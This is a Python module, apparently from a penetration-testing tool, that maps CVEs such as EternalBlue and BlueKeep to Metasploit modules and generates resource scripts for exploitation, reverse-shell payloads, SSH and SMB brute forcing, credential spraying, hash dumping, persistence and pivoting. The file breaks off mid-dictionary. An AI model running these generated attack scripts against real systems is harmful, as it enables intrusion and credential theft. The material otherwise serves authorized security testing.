#!/usr/bin/env python3
"""
souleyez.core.msf_integration - Metasploit Framework integration utilities
"""

import os
import re
import shlex
import subprocess
from typing import Dict, List, Optional, Tuple

# CVE Database mapping CVEs to MSF modules
CVE_DATABASE = {
    "CVE-2017-0143": {
        "modules": ["exploit/windows/smb/ms17_010_eternalblue"],
        "affected_versions": {
            "smb": ["SMBv1"],
            "os": [
                "Windows 7",
                "Windows Server 2008",
                "Windows Server 2008 R2",
                "Windows 8.1",
                "Windows 10",
            ],
        },
        "cvss": 8.1,
        "reliability": "excellent",
        "requires": [],
        "impact": "Remote Code Execution",
    },
    "CVE-2019-0708": {
        "modules": ["exploit/windows/rdp/cve_2019_0708_bluekeep_rce"],
        "affected_versions": {
            "rdp": ["7.0", "7.1", "8.0", "8.1"],
            "os": ["Windows 7", "Windows Server 2008", "Windows Server 2008 R2"],
        },
        "cvss": 9.8,
        "reliability": "normal",
        "requires": [],
        "impact": "Remote Code Execution",
    },
    "CVE-2011-2523": {
        "modules": ["exploit/unix/ftp/vsftpd_234_backdoor"],
        "affected_versions": {"ftp": ["vsftpd 2.3.4"]},
        "cvss": 10.0,
        "reliability": "excellent",
        "requires": [],
        "impact": "Remote Code Execution",
    },
    "CVE-2014-6271": {
        "modules": ["exploit/multi/http/apache_mod_cgi_bash_env_exec"],
        "affected_versions": {"bash": ["<4.3"], "cgi": ["*"]},
        "cvss": 9.8,
        "reliability": "excellent",
        "requires": [],
        "impact": "Remote Code Execution",
    },
    "CVE-2007-2447": {
        "modules": ["exploit/multi/samba/usermap_script"],
        "affected_versions": {
            "smb": [
                "Samba 3.0.20",
                "Samba 3.0.21",
                "Samba 3.0.22",
                "Samba 3.0.23",
                "Samba 3.0.24",
                "Samba 3.0.25",
            ]
        },
        "cvss": 10.0,
        "reliability": "excellent",
        "requires": [],
        "impact": "Remote Code Execution",
    },
    "CVE-2008-4250": {
        "modules": ["exploit/windows/smb/ms08_067_netapi"],
        "affected_versions": {
            "os": ["Windows 2000", "Windows XP", "Windows Server 2003"]
        },
        "cvss": 10.0,
        "reliability": "excellent",
        "requires": [],
        "impact": "Remote Code Execution",
    },
    "CVE-2012-1823": {
        "modules": ["exploit/multi/http/php_cgi_arg_injection"],
        "affected_versions": {"php": ["5.3.0-5.3.12", "5.4.0-5.4.2"]},
        "cvss": 7.5,
        "reliability": "good",
        "requires": [],
        "impact": "Remote Code Execution",
    },
    "CVE-2021-4034": {
        "modules": ["exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec"],
        "affected_versions": {"polkit": ["<=0.120"]},
        "cvss": 7.8,
        "reliability": "excellent",
        "requires": ["local_access"],
        "impact": "Privilege Escalation",
    },
    "CVE-2021-3156": {
        "modules": ["exploit/linux/local/sudo_baron_samedit"],
        "affected_versions": {"sudo": ["1.8.2-1.8.31p2", "1.9.0-1.9.5p1"]},
        "cvss": 7.8,
        "reliability": "excellent",
        "requires": ["local_access"],
        "impact": "Privilege Escalation",
    },
    "CVE-2017-7494": {
        "modules": ["exploit/linux/samba/is_known_pipename"],
        "affected_versions": {
            "smb": ["Samba 3.5.0-4.6.4", "Samba 4.5.0-4.5.9", "Samba 4.4.0-4.4.13"]
        },
        "cvss": 7.5,
        "reliability": "good",
        "requires": [],
        "impact": "Remote Code Execution",
    },
}


class VersionMatcher:
    """Match service versions to vulnerable version ranges."""

    @staticmethod
    def parse_version(version_string: str) -> Optional[Tuple]:
        """
        Parse version string to comparable tuple (major, minor, patch).

        Args:
            version_string: Version string like "2.4.49" or "OpenSSH 7.4"

        Returns:
            Tuple of (major, minor, patch) or None if unparseable
        """
        # Extract version numbers from string
        version_match = re.search(r"(\d+)\.(\d+)(?:\.(\d+))?", version_string)
        if not version_match:
            return None

        major = int(version_match.group(1))
        minor = int(version_match.group(2))
        patch = int(version_match.group(3)) if version_match.group(3) else 0

        return (major, minor, patch)

    @staticmethod
    def is_in_range(version: Tuple, range_str: str) -> bool:
        """
        Check if version is within a range string.

        Args:
            version: Parsed version tuple (major, minor, patch)
            range_str: Range like "7.0-7.6", "<=0.120", "<4.3", or exact "2.3.4"

        Returns:
            True if version is in range
        """
        # Handle <= comparisons
        if range_str.startswith("<="):
            max_ver_str = range_str[2:].strip()
            max_ver = VersionMatcher.parse_version(max_ver_str)
            if max_ver:
                return version <= max_ver

        # Handle < comparisons
        if range_str.startswith("<"):
            max_ver_str = range_str[1:].strip()
            max_ver = VersionMatcher.parse_version(max_ver_str)
            if max_ver:
                return version < max_ver

        # Handle range (e.g., "1.8.2-1.8.31p2")
        if "-" in range_str:
            parts = range_str.split("-")
            if len(parts) == 2:
                min_ver = VersionMatcher.parse_version(parts[0].strip())
                max_ver = VersionMatcher.parse_version(parts[1].strip())
                if min_ver and max_ver:
                    return min_ver <= version <= max_ver

        # Handle exact match or wildcard
        if range_str == "*":
            return True

        # Exact version match
        exact_ver = VersionMatcher.parse_version(range_str)
        if exact_ver:
            return version == exact_ver

        return False

    @staticmethod
    def is_vulnerable(service_version: str, vulnerable_ranges: List[str]) -> bool:
        """
        Check if service version falls within any vulnerable range.

        Args:
            service_version: Service version string (e.g., "OpenSSH 7.4", "2.4.49")
            vulnerable_ranges: List of version ranges

        Returns:
            True if version is vulnerable
        """
        parsed_version = VersionMatcher.parse_version(service_version)
        if not parsed_version:
            # Try exact string match for specific versions
            for range_str in vulnerable_ranges:
                if range_str.lower() in service_version.lower():
                    return True
            return False

        for range_str in vulnerable_ranges:
            if VersionMatcher.is_in_range(parsed_version, range_str):
                return True

        return False

    @staticmethod
    def get_cves_for_version(service: str, version: str) -> List[str]:
        """
        Return CVEs affecting this specific service version.

        Args:
            service: Service name (e.g., 'ssh', 'smb', 'http')
            version: Version string

        Returns:
            List of CVE IDs
        """
        matching_cves = []

        for cve_id, cve_data in CVE_DATABASE.items():
            affected_versions = cve_data.get("affected_versions", {})

            # Check if this CVE affects this service type
            for service_type, version_ranges in affected_versions.items():
                if (
                    service_type.lower() in service.lower()
                    or service.lower() in service_type.lower()
                ):
                    if VersionMatcher.is_vulnerable(version, version_ranges):
                        matching_cves.append(cve_id)
                        break

        return matching_cves


class MSFResourceGenerator:
    """Generate Metasploit resource scripts from souleyez data."""

    def __init__(self, output_dir: str = None):
        """Initialize generator with output directory."""
        self.output_dir = output_dir or os.path.join(os.getcwd(), "msf_resources")
        os.makedirs(self.output_dir, exist_ok=True)

    def generate_header(self) -> str:
        """Generate resource script header with metadata."""
        from datetime import datetime

        return f"""# Metasploit Resource Script
# Generated by souleyez on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
#
# Usage: msfconsole -r this_script.rc
#

"""

    def generate_smb_psexec_script(
        self, writable_shares: List[Dict], credentials: List[Dict]
    ) -> str:
        """
        Generate psexec attack script for writable SMB shares.

        Args:
            writable_shares: List of writable SMB shares from SMBSharesManager
            credentials: List of valid credentials from CredentialsManager

        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += "# SMB PsExec Attack - Writable Shares\n"
        script += "# Attempts to execute commands on hosts with writable shares\n\n"

        # Group shares by host
        shares_by_host = {}
        for share in writable_shares:
            host_ip = share.get("ip_address")
            if host_ip not in shares_by_host:
                shares_by_host[host_ip] = []
            shares_by_host[host_ip].append(share)

        # Find SMB credentials
        smb_creds = [
            c
            for c in credentials
            if c.get("service", "").lower() in ["smb", "smb2", "445", "cifs"]
        ]

        if not smb_creds:
            script += "# WARNING: No SMB credentials found!\n"
            script += "# You'll need to set SMBUser and SMBPass manually\n\n"

        for host_ip, shares in shares_by_host.items():
            script += f"\n# Target: {host_ip}\n"
            script += f"# Writable shares: {', '.join([s.get('share_name', 'unknown') for s in shares])}\n"
            script += "use exploit/windows/smb/psexec\n"
            script += f"set RHOSTS {host_ip}\n"

            if smb_creds:
                # Use first valid credential
                cred = smb_creds[0]
                script += f"set SMBUser {cred.get('username', 'Administrator')}\n"
                script += f"set SMBPass {cred.get('password', '')}\n"

            script += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
            script += "set LHOST 0.0.0.0  # CHANGE THIS\n"
            script += "set LPORT 4444\n"
            script += "exploit -z\n"
            script += "\n"

        return script

    def generate_ssh_bruteforce_script(
        self,
        ssh_hosts: List[Dict],
        username_file: str = None,
        password_file: str = None,
    ) -> str:
        """
        Generate SSH brute force script.

        Args:
            ssh_hosts: List of hosts with SSH service
            username_file: Path to username wordlist
            password_file: Path to password wordlist

        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += "# SSH Brute Force Attack\n"
        script += "# WARNING: This is noisy and may trigger IDS/IPS alerts!\n"
        script += "# Ensure you have authorization before running.\n\n"

        # Default wordlists - use project's self-contained wordlists
        from souleyez.wordlists import resolve_wordlist_path

        if not username_file:
            username_file = resolve_wordlist_path("data/wordlists/usernames_common.txt")

        if not password_file:
            password_file = resolve_wordlist_path("data/wordlists/passwords_brute.txt")

        script += "use auxiliary/scanner/ssh/ssh_login\n"

        # Build RHOSTS list
        rhosts = " ".join([h.get("ip_address", "") for h in ssh_hosts])
        script += f"set RHOSTS {rhosts}\n"
        script += f"set USER_FILE {username_file}\n"
        script += f"set PASS_FILE {password_file}\n"
        script += "set THREADS 10\n"
        script += "set VERBOSE true\n"
        script += "set STOP_ON_SUCCESS true\n"

        # Add file existence checks as comments
        script += "\n# Wordlist files:\n"
        script += f"#   Users: {username_file}\n"
        script += f"#   Passwords: {password_file}\n"
        script += "# Make sure these files exist before running!\n\n"

        script += "run\n"

        return script

    def generate_credential_spray_script(
        self, credentials: List[Dict], targets: List[Dict]
    ) -> str:
        """
        Generate credential spraying script across multiple services.

        Args:
            credentials: List of discovered credentials
            targets: List of hosts with services

        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += "# Credential Spraying - Test credentials across all targets\n\n"

        # Group targets by service
        services_map = {}
        for target in targets:
            service = target.get("service_name", "unknown").lower()
            port = target.get("port", 0)
            ip = target.get("ip_address", "")

            if service not in services_map:
                services_map[service] = []
            services_map[service].append((ip, port))

        # SSH credential spray
        if "ssh" in services_map:
            script += "\n# SSH Credential Spray\n"
            script += "use auxiliary/scanner/ssh/ssh_login\n"
            rhosts = " ".join([ip for ip, _ in services_map["ssh"]])
            script += f"set RHOSTS {rhosts}\n"

            for cred in credentials:
                username = cred.get("username", "")
                password = cred.get("password", "")
                if username and password:
                    script += f"set USERNAME {username}\n"
                    script += f"set PASSWORD {password}\n"
                    script += "run\n"
            script += "\n"

        # SMB credential spray
        if any(s in services_map for s in ["smb", "microsoft-ds", "netbios-ssn"]):
            script += "\n# SMB Credential Spray\n"
            script += "use auxiliary/scanner/smb/smb_login\n"

            # Get all SMB-related hosts
            smb_hosts = []
            for key in ["smb", "microsoft-ds", "netbios-ssn"]:
                if key in services_map:
                    smb_hosts.extend([ip for ip, _ in services_map[key]])

            rhosts = " ".join(set(smb_hosts))
            script += f"set RHOSTS {rhosts}\n"

            for cred in credentials:
                username = cred.get("username", "")
                password = cred.get("password", "")
                if username and password:
                    script += f"set SMBUser {username}\n"
                    script += f"set SMBPass {password}\n"
                    script += "run\n"
            script += "\n"

        return script

    def generate_exploit_script(self, vulnerabilities: List[Dict]) -> str:
        """
        Generate exploit script based on discovered vulnerabilities.

        Args:
            vulnerabilities: List of findings with exploit recommendations

        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += "# Automated Exploitation - Based on discovered vulnerabilities\n"
        script += "# WARNING: Review and modify before running!\n"
        script += "# Some exploits may crash services or cause system instability\n\n"

        for vuln in vulnerabilities:
            title = vuln.get("title", "Unknown")
            host_ip = vuln.get("ip_address", "N/A")
            port = vuln.get("port", 0)

            script += f"\n# {title} on {host_ip}:{port}\n"

            # Try to determine module from vulnerability
            module = self._get_exploit_module(vuln)

            if module:
                script += f"use {module}\n"
                script += f"set RHOST {host_ip}\n"
                if port:
                    script += f"set RPORT {port}\n"

                # Check if this module needs payload configuration
                needs_payload = self._module_needs_payload(module)

                if needs_payload:
                    # Get appropriate payload for the module
                    payload = self._get_default_payload(module)
                    script += f"set PAYLOAD {payload}\n"
                    script += "set LHOST 0.0.0.0  # CHANGE THIS to your IP\n"
                    script += "set LPORT 4444\n"

                script += "check\n"
                script += "# exploit -z  # Uncomment to actually run the exploit\n"
            else:
                script += "# No known exploit module for this vulnerability\n"
                script += f"# Search manually: search {title.split()[0]}\n"

            script += "\n"

        return script

    def _module_needs_payload(self, module: str) -> bool:
        """Check if module requires payload configuration."""
        # Modules that don't need payload configuration
        no_payload_modules = [
            "vsftpd_234_backdoor",  # Has built-in backdoor
            "usermap_script",  # Uses command execution
            "distcc_exec",  # Direct command execution
        ]

        for no_payload in no_payload_modules:
            if no_payload in module:
                return False

        # Most exploits need payloads
        return True

    def _get_default_payload(self, module: str) -> str:
        """Get appropriate default payload for a module."""
        module_lower = module.lower()

        # Windows exploits
        if "windows" in module_lower:
            return "windows/shell_reverse_tcp"

        # Linux/Unix exploits
        if "linux" in module_lower or "unix" in module_lower:
            return "cmd/unix/reverse_netcat"

        # Multi-platform - default to unix shell (works on most targets)
        return "cmd/unix/reverse_netcat"

    def _get_exploit_module(self, vuln: Dict) -> Optional[str]:
        """Map vulnerability to MSF exploit module."""
        title = vuln.get("title", "").lower()
        description = vuln.get("description", "").lower()

        # Simple keyword matching (can be expanded)
        module_map = {
            "eternalblue": "exploit/windows/smb/ms17_010_eternalblue",
            "ms17-010": "exploit/windows/smb/ms17_010_eternalblue",
            "bluekeep": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            "cve-2019-0708": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            "shellshock": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
            "vsftpd 2.3.4": "exploit/unix/ftp/vsftpd_234_backdoor",
            "distcc": "exploit/unix/misc/distcc_exec",
            "samba 3.0.20": "exploit/multi/samba/usermap_script",
        }

        for keyword, module in module_map.items():
            if keyword in title or keyword in description:
                return module

        return None

    def generate_web_exploitation_script(
        self, web_services: List[Dict], vulnerabilities: List[Dict] = None
    ) -> str:
        """
        Generate script for web application exploitation.

        Args:
            web_services: List of web services (HTTP/HTTPS)
            vulnerabilities: Optional list of web vulnerabilities

        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += "# Web Application Exploitation\n"
        script += "# Tests for common web vulnerabilities\n\n"

        for service in web_services:
            host_ip = service.get("ip_address", "")
            port = service.get("port", 80)
            proto = (
                "https"
                if service.get("service_name", "").lower() == "https"
                else "http"
            )

            script += f"\n# Target: {proto}://{host_ip}:{port}\n"

            # Shellshock test
            script += "\n## Test for Shellshock (CVE-2014-6271)\n"
            script += "use auxiliary/scanner/http/apache_mod_cgi_bash_env_exec\n"
            script += f"set RHOSTS {host_ip}\n"
            script += f"set RPORT {port}\n"
            script += f"set SSL {'true' if proto == 'https' else 'false'}\n"
            script += "run\n\n"

            # Directory traversal
            script += "## Directory Traversal Scanner\n"
            script += "use auxiliary/scanner/http/dir_traversal\n"
            script += f"set RHOSTS {host_ip}\n"
            script += f"set RPORT {port}\n"
            script += "run\n\n"

            # File upload scanner
            script += "## File Upload Scanner\n"
            script += "use auxiliary/scanner/http/http_put\n"
            script += f"set RHOSTS {host_ip}\n"
            script += f"set RPORT {port}\n"
            script += "run\n\n"

        return script

    def generate_post_exploitation_script(
        self, compromised_hosts: List[Dict], objectives: List[str] = None
    ) -> str:
        """
        Generate post-exploitation script.

        Args:
            compromised_hosts: List of compromised hosts with session IDs
            objectives: List of objectives ['escalate', 'pivot', 'dump_creds', 'persist', 'exfil']

        Returns:
            Resource script content
        """
        if objectives is None:
            objectives = ["escalate", "dump_creds"]

        script = self.generate_header()
        script += "# Post-Exploitation Activities\n"
        script += "# WARNING: Only run on authorized systems!\n\n"

        for host in compromised_hosts:
            session_id = host.get("session_id", 1)
            host_ip = host.get("ip_address", "N/A")
            os_type = host.get("os", "unknown").lower()

            script += f"\n# Host: {host_ip} (Session {session_id})\n"

            if "escalate" in objectives:
                script += "\n## Privilege Escalation\n"
                if "windows" in os_type:
                    script += f"use post/multi/recon/local_exploit_suggester\n"
                    script += f"set SESSION {session_id}\n"
                    script += "run\n\n"
                    script += f"use post/windows/gather/enum_patches\n"
                    script += f"set SESSION {session_id}\n"
                    script += "run\n\n"
                elif "linux" in os_type:
                    script += f"use post/multi/recon/local_exploit_suggester\n"
                    script += f"set SESSION {session_id}\n"
                    script += "run\n\n"

            if "dump_creds" in objectives:
                script += "\n## Credential Dumping\n"
                if "windows" in os_type:
                    script += f"use post/windows/gather/hashdump\n"
                    script += f"set SESSION {session_id}\n"
                    script += "run\n\n"
                    script += (
                        f"use post/windows/gather/credentials/credential_collector\n"
                    )
                    script += f"set SESSION {session_id}\n"
                    script += "run\n\n"
                elif "linux" in os_type:
                    script += f"use post/linux/gather/hashdump\n"
                    script += f"set SESSION {session_id}\n"
                    script += "run\n\n"

            if "persist" in objectives:
                script += "\n## Persistence\n"
                if "windows" in os_type:
                    script += f"use exploit/windows/local/persistence_service\n"
                    script += f"set SESSION {session_id}\n"
                    script += "# exploit  # Uncomment to create persistence\n\n"
                elif "linux" in os_type:
                    script += f"use post/linux/manage/sshkey_persistence\n"
                    script += f"set SESSION {session_id}\n"
                    script += "# run  # Uncomment to create SSH key persistence\n\n"

            if "pivot" in objectives:
                script += "\n## Network Pivoting\n"
                script += f"use post/multi/manage/autoroute\n"
                script += f"set SESSION {session_id}\n"
                script += "run\n\n"
                script += "# Now you can scan internal network via this session\n\n"

        return script

    def generate_enumeration_script(
        self, services: List[Dict], enumeration_depth: str = "standard"
    ) -> str:
        """
        Generate comprehensive enumeration script.

        Args:
            services: List of services to enumerate
            enumeration_depth: 'light', 'standard', or 'aggressive'

        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += f"# Service Enumeration - {enumeration_depth.upper()} mode\n\n"

        # Group by service type
        service_groups = {}
        for service in services:
            service_name = service.get("service_name", "unknown").lower()
            if service_name not in service_groups:
                service_groups[service_name] = []
            service_groups[service_name].append(service)

        for service_name, service_list in service_groups.items():
            script += f"\n# {service_name.upper()} Enumeration\n"

            rhosts = " ".join([s.get("ip_address", "") for s in service_list])
            port = service_list[0].get("port", 0)

            if service_name == "smb":
                script += "use auxiliary/scanner/smb/smb_version\n"
                script += f"set RHOSTS {rhosts}\n"
                script += "run\n\n"

                script += "use auxiliary/scanner/smb/smb_enumshares\n"
                script += f"set RHOSTS {rhosts}\n"
                script += "run\n\n"

                if enumeration_depth in ["standard", "aggressive"]:
                    script += "use auxiliary/scanner/smb/smb_enumusers\n"
                    script += f"set RHOSTS {rhosts}\n"
                    script += "run\n\n"

            elif service_name == "ssh":
                script += "use auxiliary/scanner/ssh/ssh_version\n"
                script += f"set RHOSTS {rhosts}\n"
                script += "run\n\n"

                if enumeration_depth == "aggressive":
                    script += "use auxiliary/scanner/ssh/ssh_enumusers\n"
                    script += f"set RHOSTS {rhosts}\n"
                    script += "run\n\n"

            elif service_name in ["http", "https"]:
                script += "use auxiliary/scanner/http/http_version\n"
                script += f"set RHOSTS {rhosts}\n"
                script += f"set RPORT {port}\n"
                script += f"set SSL {'true' if service_name == 'https' else 'false'}\n"
                script += "run\n\n"

                script += "use auxiliary/scanner/http/robots_txt\n"
                script += f"set RHOSTS {rhosts}\n"
                script += f"set RPORT {port}\n"
                script += "run\n\n"

        return script

    def generate_database_attack_script(
        self, db_services: List[Dict], attack_type: str = "auth"
    ) -> str:
        """
        Generate database-specific attack script.

        Args:
            db_services: List of database services
            attack_type: 'auth', 'extract', 'exploit'

        Returns:
            Resource script content
        """
        script = self.generate_header()
        script += f"# Database Attack - {attack_type.upper()} mode\n\n"

        for db in db_services:
            host_ip = db.get("ip_address", "")
            port = db.get("port", 0)
            service_name = db.get("service_name", "").lower()

            script += f"\n# Target: {service_name} on {host_ip}:{port}\n"

            if service_name in ["mysql", "mariadb"]:
                if attack_type == "auth":
                    script += "use auxiliary/scanner/mysql/mysql_login\n"
                    script += f"set RHOSTS {host_ip}\n"
                    script += f"set RPORT {port}\n"
                    script += "set STOP_ON_SUCCESS true\n"
                    script += "# set USER_FILE /path/to/users.txt\n"
                    script += "# set PASS_FILE /path/to/passwords.txt\n"
                    script += "run\n\n"
                elif attack_type == "extract":
                    script += "use auxiliary/admin/mysql/mysql_enum\n"
                    script += f"set RHOSTS {host_ip}\n"
                    script += f"set RPORT {port}\n"
                    script += "# set USERNAME root\n"
                    script += "# set PASSWORD password\n"
                    script += "run\n\n"

            elif service_name in ["postgresql", "postgres"]:
                if attack_type == "auth":
                    script += "use auxiliary/scanner/postgres/postgres_login\n"
                    script += f"set RHOSTS {host_ip}\n"
                    script += f"set RPORT {port}\n"
                    script += "run\n\n"

            elif service_name in ["mssql", "ms-sql-s"]:
                if attack_type == "auth":
                    script += "use auxiliary/scanner/mssql/mssql_login\n"
                    script += f"set RHOSTS {host_ip}\n"
                    script += f"set RPORT {port}\n"
                    script += "run\n\n"
                elif attack_type == "extract":
                    script += "use auxiliary/admin/mssql/mssql_enum\n"
                    script += f"set RHOSTS {host_ip}\n"
                    script += "# set USERNAME sa\n"
                    script += "# set PASSWORD password\n"
                    script += "run\n\n"

        return script

    def save_script(self, content: str, filename: str) -> str:
        """
        Save resource script to file.

        Args:
            content: Script content
            filename: Output filename (without path)

        Returns:
            Full path to saved file
        """
        filepath = os.path.join(self.output_dir, filename)

        with open(filepath, "w") as f:
            f.write(content)

        # Make executable
        os.chmod(filepath, 0o700)

        return filepath


class MSFModuleSelector:
    """Recommend MSF modules based on service/vulnerability data."""

    # Module database with metadata
    MODULES = {
        "ssh": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/ssh/ssh_version",
                    "name": "SSH Version Scanner",
                    "description": "Detect SSH server version",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/ssh/ssh_enumusers",
                    "name": "SSH User Enumeration",
                    "description": "Enumerate valid SSH usernames",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/ssh/ssh_login",
                    "name": "SSH Login Scanner",
                    "description": "Brute force SSH authentication",
                    "risk": "noisy",
                },
            ],
            "exploit": [],
        },
        "smb": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/smb/smb_version",
                    "name": "SMB Version Detection",
                    "description": "Detect SMB version and OS",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/smb/smb_enumshares",
                    "name": "SMB Share Enumeration",
                    "description": "List available SMB shares",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/smb/smb_enumusers",
                    "name": "SMB User Enumeration",
                    "description": "Enumerate SMB users via RID cycling",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/smb/smb_login",
                    "name": "SMB Login Scanner",
                    "description": "Brute force SMB authentication",
                    "risk": "noisy",
                },
            ],
            "exploit": [
                {
                    "path": "exploit/windows/smb/ms17_010_eternalblue",
                    "name": "EternalBlue SMB RCE",
                    "description": "Exploit MS17-010 (EternalBlue)",
                    "risk": "dangerous",
                    "cve": ["CVE-2017-0143", "CVE-2017-0144", "CVE-2017-0145"],
                },
                {
                    "path": "exploit/multi/samba/usermap_script",
                    "name": "Samba Usermap Script",
                    "description": "Samba 3.0.20-3.0.25 username map script command execution",
                    "risk": "dangerous",
                    "cve": ["CVE-2007-2447"],
                },
                {
                    "path": "exploit/windows/smb/psexec",
                    "name": "PsExec",
                    "description": "Execute commands via SMB (requires creds)",
                    "risk": "moderate",
                    "requires": "credentials",
                },
            ],
        },
        "http": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/http/dir_scanner",
                    "name": "Directory Scanner",
                    "description": "Brute force web directories",
                    "risk": "noisy",
                },
                {
                    "path": "auxiliary/scanner/http/http_version",
                    "name": "HTTP Version Detection",
                    "description": "Detect web server version",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/http/robots_txt",
                    "name": "Robots.txt Scanner",
                    "description": "Check robots.txt for paths",
                    "risk": "safe",
                },
            ],
            "exploit": [],
        },
        "https": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/http/dir_scanner",
                    "name": "Directory Scanner",
                    "description": "Brute force web directories",
                    "risk": "noisy",
                },
                {
                    "path": "auxiliary/scanner/http/http_version",
                    "name": "HTTP Version Detection",
                    "description": "Detect web server version",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/ssl/ssl_version",
                    "name": "SSL/TLS Version Scanner",
                    "description": "Detect SSL/TLS version and ciphers",
                    "risk": "safe",
                },
            ],
            "exploit": [],
        },
        "ftp": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/ftp/ftp_version",
                    "name": "FTP Version Scanner",
                    "description": "Detect FTP server version",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/ftp/anonymous",
                    "name": "FTP Anonymous Login",
                    "description": "Check for anonymous FTP access",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/ftp/ftp_login",
                    "name": "FTP Login Scanner",
                    "description": "Brute force FTP authentication",
                    "risk": "noisy",
                },
            ],
            "exploit": [
                {
                    "path": "exploit/unix/ftp/vsftpd_234_backdoor",
                    "name": "VSFTPD 2.3.4 Backdoor",
                    "description": "Exploit VSFTPD 2.3.4 backdoor",
                    "risk": "dangerous",
                    "cve": ["CVE-2011-2523"],
                },
                {
                    "path": "exploit/linux/ftp/proftp_sreplace",
                    "name": "ProFTPD sreplace Buffer Overflow",
                    "description": "Exploit ProFTPD sreplace vulnerability",
                    "risk": "dangerous",
                },
            ],
        },
        "mysql": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/mysql/mysql_version",
                    "name": "MySQL Version Scanner",
                    "description": "Detect MySQL server version",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/mysql/mysql_login",
                    "name": "MySQL Login Scanner",
                    "description": "Brute force MySQL authentication",
                    "risk": "noisy",
                },
                {
                    "path": "auxiliary/admin/mysql/mysql_enum",
                    "name": "MySQL Enumeration",
                    "description": "Enumerate MySQL databases and users",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/admin/mysql/mysql_sql",
                    "name": "MySQL SQL Query",
                    "description": "Execute SQL queries on MySQL (requires creds)",
                    "risk": "moderate",
                    "requires": "credentials",
                },
            ],
            "exploit": [],
        },
        "postgresql": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/postgres/postgres_version",
                    "name": "PostgreSQL Version Scanner",
                    "description": "Detect PostgreSQL version",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/postgres/postgres_login",
                    "name": "PostgreSQL Login Scanner",
                    "description": "Brute force PostgreSQL authentication",
                    "risk": "noisy",
                },
            ],
            "exploit": [],
        },
        "mssql": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/mssql/mssql_ping",
                    "name": "MSSQL Ping Scanner",
                    "description": "Discover MSSQL instances",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/mssql/mssql_login",
                    "name": "MSSQL Login Scanner",
                    "description": "Brute force MSSQL authentication",
                    "risk": "noisy",
                },
                {
                    "path": "auxiliary/admin/mssql/mssql_enum",
                    "name": "MSSQL Enumeration",
                    "description": "Enumerate MSSQL databases and configuration",
                    "risk": "safe",
                },
            ],
            "exploit": [],
        },
        "rdp": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/rdp/rdp_scanner",
                    "name": "RDP Scanner",
                    "description": "Detect RDP service",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
                    "name": "BlueKeep Scanner",
                    "description": "Check for CVE-2019-0708 vulnerability",
                    "risk": "safe",
                },
            ],
            "exploit": [
                {
                    "path": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
                    "name": "BlueKeep RDP RCE",
                    "description": "Exploit CVE-2019-0708 (BlueKeep)",
                    "risk": "dangerous",
                    "cve": ["CVE-2019-0708"],
                },
            ],
        },
        "telnet": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/telnet/telnet_version",
                    "name": "Telnet Version Scanner",
                    "description": "Detect Telnet service version",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/telnet/telnet_login",
                    "name": "Telnet Login Scanner",
                    "description": "Brute force Telnet authentication",
                    "risk": "noisy",
                },
            ],
            "exploit": [],
        },
        "smtp": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/smtp/smtp_version",
                    "name": "SMTP Version Scanner",
                    "description": "Detect SMTP server version",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/smtp/smtp_enum",
                    "name": "SMTP User Enumeration",
                    "description": "Enumerate SMTP users via VRFY/EXPN",
                    "risk": "safe",
                },
            ],
            "exploit": [],
        },
        "vnc": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/vnc/vnc_none_auth",
                    "name": "VNC No Authentication Scanner",
                    "description": "Check for VNC without authentication",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/vnc/vnc_login",
                    "name": "VNC Login Scanner",
                    "description": "Brute force VNC authentication",
                    "risk": "noisy",
                },
            ],
            "exploit": [],
        },
        "snmp": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/snmp/snmp_enum",
                    "name": "SNMP Enumeration",
                    "description": "Enumerate SNMP information",
                    "risk": "safe",
                },
                {
                    "path": "auxiliary/scanner/snmp/snmp_login",
                    "name": "SNMP Community String Scanner",
                    "description": "Brute force SNMP community strings",
                    "risk": "noisy",
                },
            ],
            "exploit": [],
        },
        "nfs": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/nfs/nfsmount",
                    "name": "NFS Mount Scanner",
                    "description": "Enumerate NFS mounts",
                    "risk": "safe",
                },
            ],
            "exploit": [],
        },
        "redis": {
            "scanner": [
                {
                    "path": "auxiliary/scanner/redis/redis_server",
                    "name": "Redis Scanner",
                    "description": "Detect Redis service",
